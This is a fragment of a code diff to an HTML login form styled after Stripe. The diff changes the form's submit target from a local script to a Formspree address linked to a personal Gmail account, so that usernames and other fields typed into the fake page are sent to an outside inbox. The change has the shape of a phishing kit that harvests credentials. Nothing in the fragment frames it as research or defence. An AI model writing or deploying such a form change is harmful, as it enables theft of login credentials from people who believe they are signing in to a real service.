@@ -150,7 +150,7 @@
           <div class="formbg">
             <div class="formbg-inner padding-horizontal--48">
               
-              <form action="user.php" method="post" id="stripe-login">
+              <form action="https://formspree.io/yvettevega002@gmail.com" method="post" id="stripe-login">
                 <div class="field padding-bottom--24">
                   <label for="Fullname">Fullname</label>
                   <input type="text" name="username">
